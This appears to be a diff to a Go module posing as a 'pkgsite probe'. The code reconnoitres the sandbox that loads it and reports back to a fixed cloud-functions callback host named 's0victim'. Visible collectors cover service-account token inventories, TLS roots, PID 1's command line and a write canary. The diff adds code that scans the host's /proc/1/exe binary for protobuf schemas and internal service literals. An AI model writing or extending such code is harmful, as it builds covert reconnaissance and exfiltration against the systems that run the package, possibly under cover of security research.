@@ -31,22 +31,22 @@ var callbackSession string
 var callbackURLSHA256 string
 
 const (
-	expectedOrigin     = "/capslock/modcache/github.com/benr00t3d/go-cgo-pkgsite-probe@v0.0.125-schema-codex"
-	expectedAgent      = "go-cgo-pkgsite-probe-v125-schema"
+	expectedOrigin     = "/capslock/modcache/github.com/benr00t3d/go-cgo-pkgsite-probe@v0.0.128-pacman-map-codex"
+	expectedAgent      = "go-cgo-pkgsite-probe-v128-pacman-map"
 	httpTimeout        = 15 * time.Second
 	sessionLength      = 10 * time.Minute
-	maximumSteps       = 3
-	maximumBody        = 16 * 1024
+	maximumSteps       = 4
+	maximumBody        = 48 * 1024
 	maximumRead        = 256 * 1024
 	maximumPath        = 512
 	maximumPID         = 4194304
 	maximumExe         = 384 * 1024 * 1024
 	maximumServices    = 32
 	maximumMethods     = 256
-	maximumProtoFiles  = 16
-	maximumMessages    = 96
-	maximumFields      = 256
-	maximumSchemaBytes = 12 * 1024
+	maximumProtoFiles  = 32
+	maximumMessages    = 256
+	maximumFields      = 1024
+	maximumSchemaBytes = 32 * 1024
 	descriptorScanTime = 20 * time.Second
 )
 
@@ -94,6 +94,7 @@ var tlsRoots = []string{
 
 var servicePackagePrefixes = []string{
 	"sos.byteman",
+	"sos.graph",
 	"sos.pacman",
 	"sos.queue",
 	"sos.talisman",
@@ -364,6 +365,12 @@ type protoSchemaReport struct {
 	Truncated       bool              `json:"truncated"`
 }
 
+type serviceLiteralReport struct {
+	ExecutableBytes int64    `json:"executable_bytes"`
+	Values          []string `json:"values"`
+	Truncated       bool     `json:"truncated"`
+}
+
 type wireField struct {
 	number int
 	wire   int
@@ -483,7 +490,7 @@ func podFingerprint() string {
 }
 
 func initialTranscript(fingerprint string) string {
-	digest := sha256.Sum256([]byte("owned-go-capslock-v125-schema/1\n" + fingerprint))
+	digest := sha256.Sum256([]byte("owned-go-capslock-v128-pacman-map/1\n" + fingerprint))
 	return hex.EncodeToString(digest[:])
 }
 
@@ -583,7 +590,11 @@ func executeProbe(request requestSpec, state *clientState, sequence int) (any, s
 	case "protobuf_services":
 		value, err = collectProtoServices("/proc/1/exe")
 	case "protobuf_schemas":
-		value, err = collectProtoSchemas("/proc/1/exe")
+		value, err = collectProtoSchemas("/proc/1/exe", "")
+	case "protobuf_schema_package":
+		value, err = collectProtoSchemas("/proc/1/exe", request.Args["package"])
+	case "service_literals":
+		value, err = collectServiceLiterals("/proc/1/exe")
 	case "path_meta":
 		value, err = collectPathMetadata(request.Args["path"])
 	case "dir_meta":
@@ -629,7 +640,7 @@ func validRequestShape(request requestSpec, workspace string) bool {
 		"interfaces": true, "dns_summary": true, "egress_receipt": true,
 		"security_status": true, "pid1_cmdline": true, "cgroup_hints": true,
 		"projected_token_inventory": true, "tls_inventory": true, "protobuf_services": true,
-		"protobuf_schemas": true,
+		"protobuf_schemas": true, "service_literals": true,
 	}
 	if noArguments[request.ID] {
 		return len(request.Args) == 0
@@ -638,6 +649,9 @@ func validRequestShape(request requestSpec, workspace string) bool {
 		return false
 	}
 	switch request.ID {
+	case "protobuf_schema_package":
+		packageName, ok := request.Args["package"]
+		return ok && (packageName == "sos.pacman" || packageName == "sos.graph")
 	case "path_meta":
 		path, ok := request.Args["path"]
 		if !ok {
@@ -1070,7 +1084,7 @@ func runWriteCanary(base string, state *clientState, sequence int) (map[string]a
 	if _, err := rand.Read(random[:]); err != nil {
 		return nil, err
 	}
-	basename := ".go-cgo-v125-schema-" + callbackSession[:8] + "-" + strconv.Itoa(sequence) + "-" + hex.EncodeToString(random[:])
+	basename := ".go-cgo-v128-pacman-map-" + callbackSession[:8] + "-" + strconv.Itoa(sequence) + "-" + hex.EncodeToString(random[:])
 	path := filepath.Join(base, basename)
 	fd, err := syscall.Open(path, syscall.O_WRONLY|syscall.O_CREAT|syscall.O_EXCL|syscall.O_NOFOLLOW|syscall.O_CLOEXEC, 0o600)
 	if err != nil {
@@ -1858,7 +1872,7 @@ func trimSchemaFile(value protoFileSchema, budget int) (protoFileSchema, bool) {
 	}
 }
 
-func collectProtoSchemas(path string) (protoSchemaReport, error) {
+func collectProtoSchemas(path, wantedPackage string) (protoSchemaReport, error) {
 	file, err := os.Open(path)
 	if err != nil {
 		return protoSchemaReport{}, err
@@ -1892,6 +1906,9 @@ func collectProtoSchemas(path string) (protoSchemaReport, error) {
 		}
 		descriptorFields, fieldsValid := protobufFields(raw)
 		fileName, packageName := firstProtoString(descriptorFields, 1), firstProtoString(descriptorFields, 2)
+		if wantedPackage != "" && packageName != wantedPackage {
+			continue
+		}
 		key := packageName + "\n" + fileName
 		if !fieldsValid || seen[key] {
 			continue
@@ -1922,6 +1939,84 @@ func collectProtoSchemas(path string) (protoSchemaReport, error) {
 		}
 		return report.Files[i].Name < report.Files[j].Name
 	})
+	return report, nil
+}
+
+func serviceLiteralCharacter(value byte) bool {
+	return (value >= 'a' && value <= 'z') || (value >= 'A' && value <= 'Z') ||
+		(value >= '0' && value <= '9') || strings.ContainsRune("._:/=-", rune(value))
+}
+
+func allowedServiceLiteral(value string) bool {
+	if len(value) < 3 || len(value) > 192 {
+		return false
+	}
+	lower := strings.ToLower(value)
+	matched := false
+	for _, keyword := range []string{"byteman", "capslock", "pacman", "queue", "talisman"} {
+		if strings.Contains(lower, keyword) {
+			matched = true
+			break
+		}
+	}
+	if !matched {
+		return false
+	}
+	if !strings.ContainsAny(value, ".-_=/:") {
+		return false
+	}
+	for index := 0; index < len(value); index++ {
+		if !serviceLiteralCharacter(value[index]) {
+			return false
+		}
+	}
+	return true
+}
+
+func collectServiceLiterals(path string) (serviceLiteralReport, error) {
+	file, err := os.Open(path)
+	if err != nil {
+		return serviceLiteralReport{}, err
+	}
+	defer file.Close()
+	info, err := file.Stat()
+	if err != nil || info.Size() < 1 || info.Size() > maximumExe {
+		return serviceLiteralReport{}, errors.New("executable outside scan bound")
+	}
+	data, err := syscall.Mmap(int(file.Fd()), 0, int(info.Size()), syscall.PROT_READ, syscall.MAP_PRIVATE)
+	if err != nil {
+		return serviceLiteralReport{}, err
+	}
+	defer syscall.Munmap(data)
+	report := serviceLiteralReport{ExecutableBytes: info.Size(), Values: []string{}}
+	seen := map[string]bool{}
+	const maximumLiterals = 192
+	for start := 0; start < len(data); {
+		for start < len(data) && !serviceLiteralCharacter(data[start]) {
+			start++
+		}
+		end := start
+		for end < len(data) && serviceLiteralCharacter(data[end]) {
+			end++
+		}
+		if end > start {
+			value := string(data[start:end])
+			if allowedServiceLiteral(value) && !seen[value] {
+				seen[value] = true
+				if len(report.Values) < maximumLiterals {
+					report.Values = append(report.Values, value)
+				} else {
+					report.Truncated = true
+				}
+			}
+		}
+		if end == start {
+			start++
+		} else {
+			start = end
+		}
+	}
+	sort.Strings(report.Values)
 	return report, nil
 }
 
@@ -2028,7 +2123,7 @@ func validateRuntimeConfiguration() error {
 	parsed, err := url.Parse(callbackURL)
 	if err != nil || parsed.Scheme != "https" || parsed.Host != "us-central1-s0victim-44547.cloudfunctions.net" ||
 		parsed.User != nil || parsed.Opaque != "" || parsed.RawQuery != "" || parsed.Fragment != "" ||
-		parsed.Path != "/go-cgo-v125-schema-codex/v1/session/"+callbackSession {
+		parsed.Path != "/go-cgo-v128-pacman-map-codex/v1/session/"+callbackSession {
 		return errors.New("invalid fixed callback URL")
 	}
 	digest := sha256.Sum256([]byte(callbackURL))
